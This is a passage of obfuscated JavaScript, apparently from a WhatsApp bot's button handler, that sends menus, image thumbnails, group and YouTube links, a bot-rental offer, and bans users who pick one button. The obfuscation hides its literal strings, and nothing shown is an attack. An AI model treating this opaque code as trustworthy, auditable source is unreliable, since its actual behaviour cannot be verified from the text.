_0x25ef59={};_0x25ef59[_0x406083(0x50e,0x358,0xa5,0xf8)+'t']=_0x4aaba1(0xab0,0xba3,0xf83,0x98e);const _0x5b4b60={};_0x5b4b60[_0x4aaba1(0x78d,0x810,0xa0d,0x4f4)]=_0x4aaba1(0xade,0xcba,0x711,0x9a3),_0x5b4b60[_0x406083(0x6b4,0xb4c,0x8bd,0xaf7)]=_0x25ef59,_0x5b4b60[_0x406083(0x7e1,0x644,0xa3a,0x503)]=0x1;const _0x11dae2={};_0x11dae2[_0x406083(0x50e,0x44,0x8c0,0x779)+'t']=_0x4aaba1(0x6d3,0xb76,0x40d,0x8ad);const _0x3d9541={};_0x3d9541['buttonId']=_0x4aaba1(0xd52,0x1203,0xbdc,0xa5e),_0x3d9541['buttonText']=_0x11dae2,_0x3d9541[_0x406083(0x7e1,0x865,0x611,0x4ba)]=0x1,sendButLocation(from,tagmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0x6f,-0x94,-0x100)+ini_mark[_0x406083(0x676,0x5bf,0xb66,0x6c6)]('@')[0x6d*0x3b+0x1a52*-0x1+0x133],tagmwnjn,[_0x5b4b60,_0x3d9541],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0x96f,0xc85,0x4a2,0x537)){console[_0x4aaba1(0x497,0x0,0xe9,0x87)](color(time,_0x406083(0xc2f,0xa0a,0x889,0xb8b)),color(_0x406083(0x6a0,0x407,0x3a0,0xbaa)+'ge\x20upmenu'));var upmenuj=await getBuffer(_0x4aaba1(0x624,0x160,0x766,0x423)+_0x406083(0x610,0x36a,0x6a8,0x297)+_0x4aaba1(0xc51,0x994,0xc88,0xa8e)+'f5bcc57f70'+_0x406083(0x4ab,0x93f,0x23e,-0x21));const _0x5b5d74={};_0x5b5d74['displayTex'+'t']='⋮☰\x20BACK';const _0x1ba927={};_0x1ba927[_0x406083(0x758,0xb9b,0x7c5,0x98f)]='Command',_0x1ba927[_0x406083(0x6b4,0x852,0x1d9,0x871)]=_0x5b5d74,_0x1ba927['type']=0x1;const _0x30c0d4={};_0x30c0d4[_0x4aaba1(0x543,0x155,0x650,0x3f1)+'t']='✓\x20OWNER';const _0x122feb={};_0x122feb[_0x406083(0x758,0x834,0xacf,0x922)]=_0x406083(0xd1d,0x11b5,0xa41,0xa08),_0x122feb[_0x406083(0x6b4,0xad1,0x85e,0x321)]=_0x30c0d4,_0x122feb[_0x4aaba1(0x816,0xd11,0xc68,0x3dc)]=0x1,sendButLocation(from,upmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x872,-0x3c,-0x4c)+ini_mark[_0x4aaba1(0x6ab,0x8c3,0xa9b,0x2ca)]('@')[0x6a*-0x5d+-0x1343+0x39c5],upmenuj,[_0x1ba927,_0x122feb],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0x9a3,0x921,0xc2d,0x937)+_0x406083(0x6d5,0x7ca,0x6cd,0x793)){console['log'](color(time,_0x406083(0xc2f,0xc7f,0x914,0xc1a)),color(_0x406083(0x6a0,0x501,0x3e2,0x9cd)+_0x406083(0x6c7,0x3be,0x4b2,0x6c6)+'cker\x20cmd'));var setcmdks=await getBuffer('https://te'+_0x406083(0x610,0x7a3,0xa05,0x6d6)+_0x4aaba1(0xd37,0x124d,0x1161,0xb41)+_0x4aaba1(0x8aa,0xb27,0xc19,0x5d4)+'7c110.jpg');const _0x26e4f8={};_0x26e4f8[_0x406083(0x50e,0x680,0xa25,0x9a2)+'t']='⋮☰\x20BACK';const _0x25bb32={};_0x25bb32[_0x406083(0x758,0x373,0xb6b,0xc09)]=_0x406083(0xaa9,0xae0,0xbfe,0x8c1),_0x25bb32[_0x4aaba1(0x6e9,0x599,0x479,0x4fe)]=_0x26e4f8,_0x25bb32[_0x406083(0x7e1,0x5c0,0x6fe,0x620)]=0x1;const _0x240b8e={};_0x240b8e[_0x4aaba1(0x543,0x8f1,0x94,0x65e)+'t']=_0x4aaba1(0x6d3,0x2ab,0x574,0x8e2);const _0x2ba421={};_0x2ba421[_0x406083(0x758,0x2b3,0x950,0x3a7)]=_0x406083(0xd1d,0x1180,0xd82,0xef1),_0x2ba421[_0x406083(0x6b4,0x436,0x5fc,0x4c9)]=_0x240b8e,_0x2ba421[_0x406083(0x7e1,0x79b,0x3a6,0xb81)]=0x1,sendButLocation(from,set_stc_cmd(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x320,0x457,0x828)+ini_mark[_0x406083(0x676,0x3d4,0xa7f,0x16e)]('@')[-0x2487+0x9a2+0x2fd*0x9],setcmdks,[_0x25bb32,_0x2ba421],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0x39d,0x7f1,0x49e,0x814)+'n'){console[_0x4aaba1(0x497,0x8cc,0x75a,0x677)](color(time,_0x4aaba1(0xc64,0x9ac,0x801,0xf29)),color(_0x4aaba1(0x6d5,0x6f5,0x56f,0x8c4)+_0x4aaba1(0xd2e,0xfe5,0xacd,0x1042)+_0x406083(0xd63,0x103d,0x127d,0x90e)));var cecanksk=await getBuffer('https://te'+_0x4aaba1(0x645,0x8a4,0x45f,0x196)+_0x4aaba1(0x8a9,0x817,0x49d,0x716)+_0x406083(0x7fe,0x9a6,0x75a,0x353)+_0x406083(0x366,0x655,-0x68,0x76a));const _0x2e580e={};_0x2e580e[_0x4aaba1(0x543,0x87b,0xc7,0x641)+'t']=_0x406083(0xa7b,0x990,0xdc5,0xc6d);const _0x47f856={};_0x47f856[_0x4aaba1(0x78d,0xc21,0x58b,0x996)]=_0x406083(0xaa9,0x636,0x9bc,0xccf),_0x47f856[_0x4aaba1(0x6e9,0x27c,0x7d5,0x9cc)]=_0x2e580e,_0x47f856[_0x4aaba1(0x816,0x438,0x4d8,0xaa3)]=0x1;const _0x116192={};_0x116192['displayTex'+'t']='✓\x20OWNER';const _0x2815db={};_0x2815db[_0x406083(0x758,0x62b,0x872,0x621)]='owner',_0x2815db[_0x4aaba1(0x6e9,0x5b6,0xaf0,0x5c6)]=_0x116192,_0x2815db[_0x4aaba1(0x816,0x8b5,0x755,0x3e4)]=0x1,sendButLocation(from,cecanmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x4aaba1(0x6ab,0x2dc,0x7d9,0x7ca)]('@')[0x4*0x60a+0x1a65+-0x328d],cecanksk,[_0x47f856,_0x2815db],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0x841,0x86a,0xc17,0xd65)+'n'){console[_0x406083(0x462,0x4e2,0x46d,0x5b9)](_0x4aaba1(0x6c0,0x917,0x88d,0x726)+_0x4aaba1(0xc18,0x109b,0x967,0x1113),_0x406083(0xa5a,0x8a9,0xb2d,0x5c4)+_0x4aaba1(0x7fe,0x583,0xb9e,0x9e7)+']',wib,color(_0x4aaba1(0x70e,0x6a0,0xbfe,0x923)+'ge\x20gacha\x20c'+_0x406083(0x725,0x6b9,0x731,0x5a6)));var coganksk=await getBuffer(_0x406083(0x5ef,0x3b2,0x1f4,0x40c)+_0x4aaba1(0x645,0x598,0x752,0xb44)+_0x4aaba1(0x67d,0x58c,0x8b6,0x8d6)+_0x4aaba1(0x495,0x4c7,0x5e0,0x490)+_0x4aaba1(0x9c7,0xe96,0x92a,0xe39));const _0x29fe44={};_0x29fe44[_0x406083(0x50e,0x79f,0x3b7,0x54e)+'t']='⋮☰\x20BACK';const _0x3c884d={};_0x3c884d['buttonId']=_0x4aaba1(0xade,0xaa1,0x825,0xe45),_0x3c884d[_0x4aaba1(0x6e9,0x72b,0x582,0x8f0)]=_0x29fe44,_0x3c884d['type']=0x1;const _0x402ec0={};_0x402ec0[_0x406083(0x50e,0x70b,0xe6,0x806)+'t']=_0x406083(0x69e,0x90b,0x716,0x30a);const _0x26c1c2={};_0x26c1c2['buttonId']=_0x406083(0xd1d,0x1181,0x11a9,0x907),_0x26c1c2[_0x406083(0x6b4,0x6b9,0x7db,0x8e8)]=_0x402ec0,_0x26c1c2[_0x406083(0x7e1,0x94b,0x38e,0xb87)]=0x1,sendButLocation(from,coganmenu(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark[_0x406083(0x676,0x67c,0x8b7,0x498)]('@')[-0x2b*-0x9f+0x1d8b+0x96*-0x60],coganksk,[_0x3c884d,_0x26c1c2],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x406083(0xaab,0xe5b,0xa69,0xd55)+_0x406083(0x8c9,0x58f,0x8bd,0x82b)){console['log'](color(time,_0x4aaba1(0xc64,0x103f,0x1052,0x7cc)),color(_0x4aaba1(0x6d5,0x779,0x4cd,0xaa8)+_0x4aaba1(0xbcd,0xf7a,0x7dd,0xa54)+_0x406083(0x643,0x61f,0x8f4,0x8a5)));var telesjtje=await getBuffer(_0x406083(0x5ef,0x698,0xa6e,0x9a6)+_0x4aaba1(0x645,0x3fe,0x6d0,0x441)+_0x4aaba1(0x470,0x93d,0x5ce,-0x18)+_0x4aaba1(0x6f4,0x2a3,0x895,0x79d)+_0x4aaba1(0x4bb,0x81f,0x7ee,0x5bb));const _0x180e15={};_0x180e15['displayTex'+'t']=_0x406083(0xa7b,0xefc,0x872,0x6cd);const _0x6e2c45={};_0x6e2c45[_0x406083(0x758,0x61a,0xa7e,0x90a)]=_0x4aaba1(0xade,0xb06,0xe26,0x77b),_0x6e2c45['buttonText']=_0x180e15,_0x6e2c45[_0x4aaba1(0x816,0xd03,0x58e,0xd37)]=0x1;const _0x5ef5ad={};_0x5ef5ad[_0x4aaba1(0x543,0x193,0x22d,0x9d)+'t']=_0x406083(0x69e,0x47d,0x232,0x797);const _0x2c59bb={};_0x2c59bb[_0x406083(0x758,0xa1d,0xbd0,0x872)]=_0x406083(0xd1d,0x870,0x1052,0xeb7),_0x2c59bb[_0x406083(0x6b4,0x22f,0xa1f,0x48a)]=_0x5ef5ad,_0x2c59bb[_0x4aaba1(0x816,0x48b,0x595,0xaff)]=0x1,sendButLocation(from,telestiker(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+'Regard\x20@'+ini_mark['split']('@')[-0x6f*-0x57+-0x1f80+0xb1*-0x9],telesjtje,[_0x6e2c45,_0x2c59bb],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc==_0x4aaba1(0xcb5,0xbc6,0xfd2,0x7aa)+'ct'){console[_0x406083(0x462,0x2e0,0x3ff,0x109)](color(time,'magenta'),color(_0x406083(0x6a0,0xa56,0xa95,0xa83)+_0x406083(0x9f8,0x78a,0xd16,0xde6)+'ffect'));var imagekskwo=await getBuffer(_0x4aaba1(0x624,0x696,0x6d3,0x4e8)+'legra.ph/f'+_0x406083(0x66e,0x488,0x4fa,0xad1)+_0x406083(0xa4a,0x6d7,0x9f7,0x837)+_0x406083(0xda3,0xfcd,0xf85,0xaf7));const _0x1d217a={};_0x1d217a[_0x406083(0x50e,0x29e,0x8fa,0x854)+'t']=_0x4aaba1(0xab0,0x81c,0xbf2,0xc2b);const _0x37b60b={};_0x37b60b[_0x4aaba1(0x78d,0x996,0xa5b,0x4af)]=_0x4aaba1(0xade,0xf12,0xa69,0x7b9),_0x37b60b['buttonText']=_0x1d217a,_0x37b60b[_0x406083(0x7e1,0x438,0x42b,0x47c)]=0x1;const _0x1c02fa={};_0x1c02fa[_0x4aaba1(0x543,0x39f,0x8c2,0x78f)+'t']='✓\x20OWNER';const _0x443a84={};_0x443a84['buttonId']=_0x4aaba1(0xd52,0xf2b,0x1084,0xfb2),_0x443a84[_0x4aaba1(0x6e9,0xc10,0xc0d,0x51c)]=_0x1c02fa,_0x443a84[_0x4aaba1(0x816,0xb71,0x7ac,0xa9e)]=0x1,sendButLocation(from,image_effect(prefix),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x4aaba1(0x3da,0x49b,0x588,0x22c)+ini_mark['split']('@')[-0x1*-0x4b1+-0x746+-0x295*-0x1],imagekskwo,[_0x37b60b,_0x443a84],{'contextInfo':{'mentionedJid':[ini_mark]}});}function _0x406083(_0x488824,_0x5a8a77,_0x3a7398,_0x3fef89){return _0x34ec(_0x488824-0x194,_0x3fef89);}if(sub_yt_zeeone_ofc=='source\x20cod'+'e'){console['log'](color(time,_0x406083(0xc2f,0xa7e,0xa87,0x10e3)),color(_0x4aaba1(0x6d5,0x1c6,0x3a5,0x51b)+_0x406083(0x61a,0xa75,0x7c4,0x2a8)+_0x406083(0x5b7,0x4d5,0x617,0x5ea)));var sourbwbbz=await getBuffer(_0x406083(0x5ef,0x92b,0x535,0x1f1)+_0x406083(0x610,0x324,0x97e,0x3b9)+_0x4aaba1(0x784,0x73c,0xa64,0x73d)+_0x406083(0x53e,0x6b6,0x330,0x403)+'0f7eb.jpg');const _0x2da209={};_0x2da209[_0x4aaba1(0x543,0x9c6,0x5fb,0x9c6)+'t']=_0x406083(0xc9f,0x8e9,0xe5b,0xc97);const _0x9b5599={};_0x9b5599[_0x406083(0x758,0x9a2,0x66c,0x79c)]=_0x406083(0xaa9,0x73c,0xe7e,0xd4e),_0x9b5599[_0x406083(0x6b4,0xa3f,0x308,0x78a)]=_0x2da209,_0x9b5599[_0x406083(0x7e1,0x41d,0x4ba,0xaf3)]=0x1;const _0x429abb={};_0x429abb[_0x406083(0x50e,0x62f,0x458,0x832)+'t']=_0x4aaba1(0x6d3,0x772,0xbe2,0x2de);const _0x10779c={};_0x10779c[_0x406083(0x758,0xa8f,0x5e0,0x91b)]=_0x4aaba1(0xd52,0xd15,0x1125,0xbfc),_0x10779c[_0x4aaba1(0x6e9,0x231,0xa03,0x858)]=_0x429abb,_0x10779c[_0x4aaba1(0x816,0x9a4,0x6e9,0xb61)]=0x1,sendButLocation(from,_0x4aaba1(0x465,0x8b9,0x733,0x96a)+_0x406083(0x77a,0xa3c,0x9b0,0x712)+_0x406083(0x5a7,0x294,0x375,0x88f)+'youtube.co'+_0x406083(0x36d,-0x141,-0x6a,0xe)+_0x406083(0xb79,0x9b8,0x681,0xd4d),''+tampilTanggal+enter+tampilWaktu+enter+enter+_0x406083(0x3a5,0xe5,0x180,0x838)+ini_mark['split']('@')[-0xd0e+-0x99b*-0x1+0x373],sourbwbbz,[_0x9b5599,_0x10779c],{'contextInfo':{'mentionedJid':[ini_mark]}});}if(sub_yt_zeeone_ofc=='Big\x20Thanks'+_0x406083(0x96a,0x6ae,0x4e2,0x675)){const ycbRvP=_0x406083(0xa38,0x649,0x766,0x82b)[_0x4aaba1(0x6ab,0xa94,0x6a5,0x920)]('|');let BHkpzb=0x10*0x127+0x67*-0x1f+-0x1*0x5f7;while(!![]){switch(ycbRvP[BHkpzb++]){case'0':var imgList=[_0x4aaba1(0x3f5,0x712,0x841,0x64c)+_0x406083(0xb90,0x94e,0xcf0,0x679)+_0x4aaba1(0x82e,0x8ad,0xb6e,0x761)+'cv1.jpg',_0x406083(0xb2b,0xb1b,0x92a,0x667)+_0x4aaba1(0xbc5,0xa41,0xb84,0xb0a)+_0x4aaba1(0xac0,0xa92,0xac6,0x6c7)+'2e1.jpg',_0x4aaba1(0x50b,0xe1,0x6bb,0x6ea)+_0x406083(0xb90,0xdeb,0xea9,0x8e1)+'/p_2032cf1'+'3z1.jpg',_0x4aaba1(0x3f5,0x21b,0x264,0xf)+_0x4aaba1(0xbc5,0xf29,0x7b3,0x950)+_0x406083(0xd8c,0x8d6,0x994,0xfa3)+_0x4aaba1(0x8d8,0x78b,0xd0b,0xd0e),_0x406083(0x7e8,0xc29,0xa30,0xcb5)+_0x4aaba1(0xbc5,0x8aa,0xb38,0xd45)+'/p_20325yp'+_0x4aaba1(0x827,0x484,0x99b,0x9ad),_0x4aaba1(0xbad,0xa0c,0xdbc,0x9d5)+_0x4aaba1(0xbc5,0xf8c,0x10be,0x1095)+_0x4aaba1(0xdb5,0xbea,0x12b0,0xea7)+'c41.jpg',_0x406083(0x524,0x96c,0x1db,0x650)+'top4top.io'+_0x406083(0x95a,0x889,0xbd1,0x83c)+_0x4aaba1(0xb26,0xaa4,0x66b,0xa6d)];continue;case'1':const _0x2ce615={};_0x2ce615[_0x406083(0xa57,0xc3f,0xae8,0x99d)]=''+ucapannya2,_0x2ce615[_0x4aaba1(0x64d,0x5c8,0x955,0x5d8)]=_0x406083(0x562,0x50d,0x9b2,0xb4)+_0x406083(0xd73,0xb68,0xe41,0x109d),_0x2ce615[_0x4aaba1(0x534,0x50b,0x10,0x569)+'e']=_0x4aaba1(0x3ef,0x873,0x248,0x752),_0x2ce615[_0x406083(0x5db,0x6bd,0xa50,0x98d)+'rl']=''+imgUrl,_0x2ce615[_0x406083(0x6f7,0x961,0x589,0x81c)]='',_0x2ce615[_0x406083(0xc81,0xe69,0x975,0xe9a)]='https://yo'+_0x406083(0xbf8,0xf66,0x92b,0xb3a)+_0x406083(0x9dd,0xc5e,0xa96,0xe95)+_0x406083(0xb9e,0x107d,0xca1,0xe7b)+_0x406083(0xb3a,0xc19,0xd30,0xcd5)+'lA';const _0x343e6f={};_0x343e6f[_0x406083(0x4fe,0x5bb,0x5fe,0x1dd)]=_0x406083(0x78b,0xa9e,0x2ed,0x331),_0x343e6f[_0x4aaba1(0x904,0x420,0xce9,0x759)+_0x406083(0x973,0x482,0x588,0x8c9)]=0x3b9aca00,_0x343e6f[_0x4aaba1(0x858,0xcfa,0xcee,0x6e3)+'d']=!![],_0x343e6f['sendEpheme'+_0x4aaba1(0x441,-0x78,-0x74,0x933)]=!![],_0x343e6f['externalAd'+'Reply']=_0x2ce615;const _0x354a75={};_0x354a75['mentionedJ'+'id']=[ini_mark],alpha[_0x4aaba1(0x8b4,0x516,0xd53,0x6fa)+'e'](from,tqto,text,{'thumbnail':fs[_0x406083(0x568,0x6f0,0x775,0x9da)+'nc']('image/'+thumbnail),'caption':_0x4aaba1(0x7c0,0xc49,0x6e5,0x595),'contextInfo':_0x343e6f,'quoted':ftoko,'contextInfo':_0x354a75});continue;case'2':tqto='\x0a\x0a•\x20ZEEONE'+_0x406083(0x8b6,0xa5f,0x655,0x784)+_0x406083(0x74d,0x448,0x5ef,0x694)+_0x4aaba1(0xc9a,0xfb3,0xd24,0xbcf)+'O\x20\x0a\x0aPowere'+'d\x20by\x20@'+ini_mark[_0x4aaba1(0x6ab,0x2f3,0x535,0xb9b)]('@')[-0xce9*0x2+-0x5d0+0x1fa2];continue;case'3':console[_0x4aaba1(0x497,0x51f,0x5c7,0x3c)](color(time,_0x4aaba1(0xc64,0xd41,0x9cd,0x1019)),color(_0x4aaba1(0x6d5,0x5b7,0x78f,0x81a)+_0x4aaba1(0x3fe,0x3ee,0x37b,0x659)+'nks\x20to'));continue;case'4':var imgUrl=imgList[Math['floor'](Math[_0x4aaba1(0xadf,0x766,0xa1d,0xa87)]()*imgList['length'])];continue;}break;}}if(sub_yt_zeeone_ofc=='Group\x20What'+_0x4aaba1(0xc04,0xade,0xff0,0xbd8)){console[_0x406083(0x462,-0x63,0x22a,0x8dd)](color(time,'magenta'),color(_0x406083(0x6a0,0x367,0x78f,0xae5)+_0x4aaba1(0x3b8,0x81e,0x81f,0x2c2)+_0x406083(0x6ef,0x95a,0x5ac,0xa47))),tqto='\x0aJoin\x20ya\x20@'+sender[_0x406083(0x676,0x376,0x80e,0xace)]('@')[-0x1*0x224f+0xf98+0x63d*0x3]+'\x20\x0a\x0a_'+gc_wa_lu+(_0x4aaba1(0x61f,0x29a,0x420,0x6fc)+_0x406083(0xc84,0xf30,0xd34,0xfa6))+ini_mark[_0x406083(0x676,0x45a,0x15d,0x40d)]('@')[0xb85+-0x5f*-0x5f+-0x1763*0x2];const _0x2026bf={};_0x2026bf['mentionedJ'+'id']=[ini_mark,sender],alpha['sendMessag'+'e'](from,tqto,text,{'thumbnail':fs['readFileSy'+'nc'](_0x4aaba1(0x594,0x3bf,0x2d5,0x174)+thumbnail),'caption':_0x4aaba1(0x7c0,0x64f,0x312,0x43d),'contextInfo':{'text':_0x4aaba1(0x7c0,0x451,0x909,0x42c),'forwardingScore':0x3b9aca00,'isForwarded':!![],'sendEphemeral':!![],'externalAdReply':{'title':''+ucapannya2,'body':''+baper,'previewType':_0x406083(0x3ba,0x6d8,-0x9e,0x210),'thumbnailUrl':'','thumbnail':fs[_0x4aaba1(0x59d,0x8e1,0x10e,0x7fb)+'nc'](_0x4aaba1(0x594,0x93c,0x682,0x71c)+thumbnail),'sourceUrl':'https://yo'+_0x4aaba1(0xc2d,0x834,0x1014,0x99d)+'channel/UC'+'dzWwbApjky'+_0x4aaba1(0xb6f,0xfdc,0xb48,0x102d)+'lA'}},'quoted':ftoko,'contextInfo':_0x2026bf});}if(sub_yt_zeeone_ofc==_0x4aaba1(0x938,0x870,0x572,0x5be)+'upport'){console[_0x406083(0x462,0x22e,-0x7e,0x724)](color(time,_0x406083(0xc2f,0xb10,0xf35,0xa74)),color(_0x4aaba1(0x6d5,0xb09,0x674,0x9b2)+_0x406083(0x545,0x4e1,0x2bb,0x39b)+_0x4aaba1(0x95b,0x9ba,0xa88,0x4b8)));const _0x53771d={};_0x53771d[_0x406083(0xcae,0x10c6,0xe1a,0xc83)]=mek,alpha['sendMessag'+'e'](from,'Ramein\x20kak'+'\x20'+pushname+enter+(_0x406083(0x3fb,0x826,0x522,0x8fb)+'at.whatsap'+_0x406083(0xa67,0xe9d,0xe1b,0xc48)+'0BcXjyBDkN'+_0x406083(0x993,0xdad,0xa89,0x910)),text,_0x53771d);}if(sub_yt_zeeone_ofc==_0x406083(0x903,0xa18,0xa0a,0xb95)+'upport\x202'){console[_0x4aaba1(0x497,0x167,0x18b,0x7e7)](color(time,_0x406083(0xc2f,0xbf0,0xaf2,0x102c)),color(_0x4aaba1(0x6d5,0x1fe,0x382,0x2d4)+_0x4aaba1(0x57a,0xa3a,0x971,0x892)+'t\x20support\x20'+'2'));const _0x587840={};_0x587840[_0x406083(0xcae,0xc8f,0xd17,0x87f)]=mek,alpha['sendMessag'+'e'](from,_0x4aaba1(0xb1c,0xa92,0x8df,0x8ce)+'\x20'+pushname+enter+(_0x406083(0x3fb,0x67c,0x19b,0x36e)+_0x406083(0x6d3,0x316,0xa6e,0x518)+_0x406083(0xac2,0x931,0xdea,0xdd3)+_0x406083(0x923,0x69b,0xcd1,0x77d)+'ssfqJNsE'),text,_0x587840);}if(subscribezeeoneofc==_0x4aaba1(0x826,0x5b5,0xb87,0xb5f)){console[_0x406083(0x462,0x7c1,0x390,0x582)]('\x1b[1;31m~\x1b['+_0x4aaba1(0xc18,0x7a7,0xf90,0xa5a),_0x406083(0xa5a,0x943,0xbd1,0x54c)+'MD\x20\x1b[1;37m'+']',wib,color('Button\x20Mes'+_0x406083(0xd32,0xe16,0x9a1,0xcc0)+_0x406083(0xd8f,0x127f,0xf01,0xe54)));var ini_gopayyy=_0x4aaba1(0x675,0xb2a,0x65a,0x675)+sender[_0x406083(0x676,0x3a8,0x7c6,0xa02)]('@')[0x1ea7+0x53*0x6e+-0x161b*0x3]+(_0x406083(0xa4e,0xe05,0xc5e,0xd6b)+_0x406083(0xd23,0x11c3,0x1105,0x7ff)+'bot?🤔\x20Boon'+_0x406083(0x423,0x7a6,0x21c,0x7ba)+_0x406083(0x71d,0x93f,0xaee,0x815));const _0x51dd46={};_0x51dd46[_0x4aaba1(0x543,0x5b3,0x55a,0x555)+'t']=_0x406083(0x500,0x54d,0x5cf,0xc0);const _0x491387={};_0x491387[_0x4aaba1(0x78d,0x7be,0x757,0x61c)]=_0x406083(0xa66,0x8d6,0xf05,0xe11),_0x491387[_0x4aaba1(0x6e9,0x337,0x9cb,0x32d)]=_0x51dd46,_0x491387['type']=0x1;const _0x549f36={};_0x549f36[_0x406083(0x50e,0x61c,0xa21,0x6d3)+'t']=_0x406083(0x675,0xb08,0x8e2,0x940);const _0x1bdb13={};_0x1bdb13['buttonId']='tidak_kak',_0x1bdb13[_0x4aaba1(0x6e9,0x9ee,0x20e,0x678)]=_0x549f36,_0x1bdb13[_0x406083(0x7e1,0x7c9,0xc4f,0x7b6)]=0x1;var buttonsss=[_0x491387,_0x1bdb13];const _0x393793={};_0x393793['contentTex'+'t']=ini_gopayyy,_0x393793[_0x406083(0x5b1,0x683,0x1e9,0x9b4)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x393793[_0x406083(0x79c,0xbf2,0xbad,0xbc3)]=buttonsss,_0x393793[_0x4aaba1(0xb0a,0xfbe,0x1014,0xf47)]=0x1,buttonMessageee=_0x393793;const _0x4c9158={};_0x4c9158[_0x4aaba1(0x533,0x5b7,0x2c4,0x24d)]='hi',_0x4c9158[_0x406083(0x8cf,0x857,0x53a,0x9a9)+_0x4aaba1(0x9a8,0xaa1,0x9e1,0x979)]=0x3b9aca00,_0x4c9158[_0x4aaba1(0x858,0xcfd,0x543,0xc3d)+'d']=!![],_0x4c9158['sendEpheme'+'ral']=!![],_0x4c9158[_0x4aaba1(0x88d,0xbff,0x6b4,0xc4f)+'id']=[sender];const _0x5dded8={};_0x5dded8[_0x4aaba1(0x4ad,0x24b,0x11e,0x887)]=_0x406083(0xbd0,0x1060,0xf7f,0x8c6)+'21',_0x5dded8[_0x406083(0x852,0x478,0x856,0xaea)+'o']=_0x4c9158,_0x5dded8[_0x4aaba1(0xce3,0xb80,0x10ed,0x90c)]=mek,_0x5dded8[_0x4aaba1(0x471,-0x66,-0x4e,0x76d)+_0x406083(0x40c,-0x42,0x42e,0xf2)]=!![],alpha[_0x4aaba1(0x8b4,0x6d7,0xca7,0xc84)+'e'](from,buttonMessageee,MessageType[_0x406083(0x9f4,0x923,0xa73,0x64d)+_0x4aaba1(0x4ff,0x726,0x1c0,0x9b4)],_0x5dded8);}subscribezeeoneofc==_0x4aaba1(0x7d9,0x98c,0x494,0xa16)&&(console['log'](_0x406083(0x68b,0x7ac,0x3ba,0x353)+'1;37m>',_0x406083(0xa5a,0xa34,0x706,0xc6d)+_0x406083(0x7c9,0x91b,0x366,0x457)+']',wib,color('Button\x20Mes'+_0x406083(0x3a6,0x1bd,0x7b6,0x3de))),reply(_0x406083(0xb9b,0x978,0x8a3,0x762)+_0x4aaba1(0xdad,0xfac,0x12cb,0xf52)+_0x406083(0xbb0,0x7e6,0x74b,0x7b4)+_0x406083(0xbaa,0xdd4,0xe02,0x975)),bnnpd=sender[_0x406083(0xa20,0x501,0x7b7,0xe04)]('@','')+(_0x4aaba1(0x88f,0x99c,0xc36,0x4df)+_0x406083(0x78f,0x73f,0xbe4,0x6f9)),banned[_0x406083(0xad9,0x9a7,0x6ef,0xf52)](bnnpd));if(subscribezeeoneofc==_0x406083(0xa66,0xc0a,0x7ef,0xba7)){const mediaxpxa=await alpha[_0x406083(0x39f,0x49b,0x542,0x83)+_0x4aaba1(0x4ff,0x9f5,0x2cf,0x29e)](from,pp_bot,MessageType[_0x406083(0x75c,0x874,0x3b8,0x25b)],{'thumbnail':pp_bot});mhan=mediaxpxa[_0x4aaba1(0x49c,0x2ff,0x875,0x328)][_0x4aaba1(0x925,0x97a,0x8e5,0x99b)+_0x406083(0xa63,0x60b,0x5a7,0xb2e)]?mediaxpxa['message']['ephemeralM'+'essage']:mediaxpxa;const _0x6b98bb={};_0x6b98bb[_0x4aaba1(0x543,0x77d,0x9f6,0x141)+'t']=_0x406083(0xb27,0xfc5,0xe24,0xc2b);const _0x58cacc={};_0x58cacc['buttonId']=_0x4aaba1(0xc3f,0x107d,0xb4d,0xa74),_0x58cacc[_0x406083(0x6b4,0x873,0x7f3,0x8f4)]=_0x6b98bb,_0x58cacc[_0x4aaba1(0x816,0x7ee,0x5aa,0x66d)]=0x1;const buttons5=[_0x58cacc],btn5={'locationMessage':mhan[_0x406083(0x467,0x3c8,0x18b,0x1c1)][_0x4aaba1(0x9fc,0x812,0xe23,0x6dc)+_0x406083(0x990,0x912,0x9d3,0x799)],'contentText':pc_sewa(_minggu,__minggu,___minggu,_bulan,_permanen,__permanen),'footerText':_0x4aaba1(0x493,0x62,0x3db,0x1a3)+_0x4aaba1(0xd96,0x111f,0xab2,0xf7b)+_0x406083(0x722,0x4c3,0x988,0xa8c)+_0x406083(0xc5b,0xbc2,0xda9,0xca8)+enter+enter+botname+_0x406083(0xa94,0x5fb,0x743,0xcbb)+ownername,'buttons':buttons5,'headerType':0x6};alpha[_0x406083(0x87f,0x843,0x374,0xaec)+'e'](from,btn5,MessageType[_0x4aaba1(0xa29,0x56b,0xf3a,0x941)+_0x4aaba1(0x4ff,0x29c,0x784,0x56f)],{});}if(subscribezeeoneofc==_0x406083(0xc0a,0xe2a,0x8c7,0x10e1)){console[_0x4aaba1(0x497,0x482,0x99e,0x8d1)](_0x406083(0x68b,0x7b4,0xb64,0x873)+_0x4aaba1(0xc18,0x9ce,0xbe7,0xfa7),_0x406083(0xa5a,0xafe,0x621,0xd23)+_0x4aaba1(0x7fe,0xc2d,0x632,0x8a9)+']',wib,color(_0x4aaba1(0x70e,0x919,0x76b,0x8f8)+'ge\x20Sewabot'));var 